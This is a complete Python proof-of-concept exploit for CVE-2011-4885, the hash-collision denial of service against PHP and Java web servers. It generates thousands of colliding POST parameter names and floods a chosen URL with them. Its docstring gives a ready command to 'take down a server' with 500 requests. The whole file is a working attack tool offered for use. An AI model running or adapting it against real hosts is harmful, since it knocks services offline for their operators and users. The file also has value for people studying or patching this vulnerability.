#! /usr/bin/env python

"""
This script was written by Christian Mehlmauer <FireFart@gmail.com>
https://twitter.com/#!/_FireFart_

Sourcecode online at:
https://github.com/FireFart/HashCollision-DOS-POC

Original PHP Payloadgenerator taken from https://github.com/koto/blog-kotowicz-net-examples/tree/master/hashcollision
CVE : CVE-2011-4885

requires Python 2.7

Examples:
-) Make a single Request, wait for the response and save the response to output0.html
python HashtablePOC.py -u https://host/index.php -v -c 1 -w -o output -t PHP

-) Take down a server(make 500 requests without waiting for a response):
python HashtablePOC.py -u https://host/index.php -v -c 500 -t PHP

Changelog:
v5.0: Define max payload size as parameter
v4.0: Get PHP Collision Chars on the fly
v3.0: Load Payload from file
v2.0: Added Support for https, switched to HTTP 1.1
v1.0: Initial Release
"""

import socket
import sys
import math
import urllib
import string
import time
import urlparse
import argparse
import ssl
import random
import itertools

def main():
    parser = argparse.ArgumentParser(description="Take down a remote PHP Host", prog="PHP Hashtable Exploit")
    parser.add_argument("-u", "--url", dest="url", help="Url to attack", required=True)
    parser.add_argument("-w", "--wait", dest="wait", action="store_true", default=False, help="wait for Response")
    parser.add_argument("-c", "--count", dest="count", type=int, default=1, help="How many requests")
    parser.add_argument("-v", "--verbose", dest="verbose", action="store_true", default=False, help="Verbose output")
    parser.add_argument("-s", "--save", dest="save", help="Save payload to file")
    parser.add_argument("-p", "--payload", dest="payload", help="Save payload to file")
    parser.add_argument("-o", "--output", dest="output", help="Save Server response to file. This name is only a pattern. HTML Extension will be appended. Implies -w")
    parser.add_argument("-t", "--target", dest="target", help="Target of the attack", choices=["ASP", "PHP", "JAVA"], required=True)
    parser.add_argument("-m", "--max-payload-size", dest="maxpayloadsize", help="Maximum size of the Payload in Megabyte. PHPs defaultconfiguration does not allow more than 8MB", default=8, type=int)
    parser.add_argument("-g", "--generate", dest="generate", help="Only generate Payload and exit", default=False, action="store_true")
    parser.add_argument("--version", action="version", version="%(prog)s 5.0")

    options = parser.parse_args()

    url = urlparse.urlparse(options.url)

    if not url.scheme:
        print("Please provide a scheme to the URL(http://, https://,..")
        sys.exit(1)

    host = url.hostname
    path = url.path
    port = url.port
    if not port:
        if url.scheme == "https":
            port = 443
        elif url.scheme == "http":
            port = 80
        else:
            print("Unsupported Protocol %s" % url.scheme)
            sys.exit(1)
    if not path:
        path = "/"

    if not options.payload:
        print("Generating Payload...")

        if options.target == "PHP":
            payload = generatePHPPayload()
        elif options.target == "ASP":
            #payload = generateASPPayload()
            print("Target %s not yet implemented" % options.target)
            sys.exit(1)
        elif options.target == "JAVA":
            payload = generateJAVAPayload()
        else:
            print("Target %s not yet implemented" % options.target)
            sys.exit(1)

        print("Payload generated")
    else:
        f = open(options.payload, "r")
        payload = f.read()
        f.close()
        print("Loaded Payload from %s" % options.payload)    

    # trim to maximum payload size (in MB)
    maxinmb = options.maxpayloadsize*1024*1024
    payload = payload[:maxinmb]
    
    # Save payload
    if options.save:
        f = open(options.save, "w")
        f.write(payload)
        f.close()
        print("Payload saved to %s" % options.save)

    # User selected to only generate the payload
    if options.generate:
        return

    print("Host: %s" % host)
    print("Port: %s" % str(port))
    print("path: %s" % path)
    print
    print

    for i in range(options.count):
        print("sending Request #%s..." % str(i+1))
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        if url.scheme == "https":
            ssl_sock = ssl.wrap_socket(sock)
            ssl_sock.connect((host, port))
            ssl_sock.settimeout(None)
        else:
            sock.connect((host, port))
            sock.settimeout(None)

        request = "POST %s HTTP/1.1\r\n\
Host: %s\r\n\
Content-Type: application/x-www-form-urlencoded; charset=utf-8\r\n\
Connection: Close\r\n\
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; de; rv:1.9.2.20) Gecko/20110803 Firefox/3.6.20 ( .NET CLR 3.5.30729; .NET4.0E)\r\n\
Content-Length: %s\r\n\
\r\n\
%s\r\n\
\r\n" % (path, host, str(len(payload)), payload)

        if url.scheme == "https":
            ssl_sock.send(request)
        else:
            sock.send(request)

        if options.verbose:
            if len(request) > 400:
                print(request[:400]+"....")
            else:
                print(request)
            print("")
        if options.wait or options.output:
            start = time.time()
            if url.scheme == "https":
                data = ssl_sock.recv(1024)
                string = ""
                while len(data):
                    string = string + data
                    data = ssl_sock.recv(1024)
            else:
                data = sock.recv(1024)
                string = ""
                while len(data):
                    string = string + data
                    data = sock.recv(1024)
            
            elapsed = (time.time() - start)
            print("Request %s finished" % str(i+1))
            print("Request %s duration: %s" % (str(i+1), elapsed))
            split = string.partition("\r\n\r\n")
            header = split[0]
            content = split[2]
            if options.verbose:
                # only print http header
                print("")
                print(header)
                print("")
            if options.output:
                f = open(options.output+str(i)+".html", "w")
                f.write("<!-- "+header+" -->\r\n"+content)
                f.close()

        if url.scheme == "https":
            ssl_sock.close()
            sock.close()
        else:
            sock.close()

def generateASPPayload():
    return "a=a"

def generateJAVAPayload():
    a = computeJAVACollisionChars(5)
    return _generatePayload(a, 8)

def generatePHPPayload():
    # Note: Default max POST Data Length in PHP is 8388608 bytes (8MB)
    # compute entries with collisions in PHP hashtable hash function 
    a = computePHPCollisionChars(5)
    return _generatePayload(a, 8);
    
def _generatePayload(collisionchars, payloadlength):
    # Taken from:
    # https://github.com/koto/blog-kotowicz-net-examples/tree/master/hashcollision

    # how long should the payload be
    length = payloadlength
    size = len(collisionchars)
    post = ""
    maxvaluefloat = math.pow(size,length)
    maxvalueint = int(math.floor(maxvaluefloat))
    for i in range (maxvalueint):
        inputstring = _base_convert(i, size)
        result = inputstring.rjust(length, "0")
        for item in collisionchars:
            result = result.replace(str(item), collisionchars[item])
        post += "" + urllib.urlencode({result:""}) + "&"

    return post;

def _base_convert(num, base):
    fullalphabet = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
    alphabet = fullalphabet[:base]
    if (num == 0):
        return alphabet[0]
    arr = []
    base = len(alphabet)
    while num:
        rem = num % base
        num = num // base
        arr.append(alphabet[rem])
    arr.reverse()
    return "".join(arr)

def computePHPCollisionChars(count):
    return _computeCollisionChars(_DJBX33A, count)

def computeJAVACollisionChars(count):
    return _computeCollisionChars(_DJBX31A, count)

def _computeCollisionChars(function, count):
    hashes = {}
    counter = 0
    length = 2
    a = ""
    for i in range(0, 256):
        a = a+chr(i)
    source = list(itertools.product(a, repeat=length))
    basestr = ''.join(random.choice(source))
    basehash = function(basestr)
    print("\tValue: %s\tHash: %s" % (basestr, basehash))
    for i in basestr:
        print("\t\tValue: %s\tCharcode: %d" % (i, ord(i)))
    hashes[str(counter)] = basestr
    counter = counter + 1
    for item in source:
        tempstr = ''.join(item)
        if tempstr == basestr:
            continue

        temphash = function(tempstr) 
        if temphash == basehash:
            print("\tValue: %s\tHash: %s" % (tempstr, temphash))
            for i in tempstr:
                print("\t\tValue: %s\tCharcode: %d" % (i, ord(i)))
            hashes[str(counter)] = tempstr
            counter = counter + 1
        if counter >= count:
            break;
    if counter != count:
        print("Not enough values found. Please start the script again")
        sys.exit(1)
    return hashes

def _DJBXA(inputstring, base, start):
    counter = len(inputstring) - 1
    result = start
    for item in inputstring:
        result = result + (math.pow(base, counter) * ord(item))
        counter = counter - 1
    return int(round(result))

#PHP
def _DJBX33A(inputstring):
    return _DJBXA(inputstring, 33, 5381)

#Java
def _DJBX31A(inputstring):
    return _DJBXA(inputstring, 31, 0)

#ASP
def _DJBX33X(inputstring):
    counter = len(inputstring) - 1
    result = 5381
    for item in inputstring:
        result = result + (int(round(math.pow(33, counter))) ^ ord(item))
        counter = counter - 1
    return int(round(result))

if __name__ == "__main__":
    main()
